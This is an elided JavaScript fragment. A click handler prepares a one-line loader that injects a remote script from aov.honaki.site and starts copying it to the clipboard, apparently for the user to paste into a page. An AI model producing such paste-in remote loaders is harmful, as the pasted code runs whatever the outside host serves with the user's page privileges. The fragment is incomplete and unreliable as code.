(function () {
    ...
    document
        ...
        .addEventListener("click", function () {
            const injectCode = `(function(){const s=document.createElement("script");s.src="https://aov.honaki.site/assets/scripts/aov-bg-uploader.min.js";document.head.appendChild(s);})();`;
            navigator.clipboard
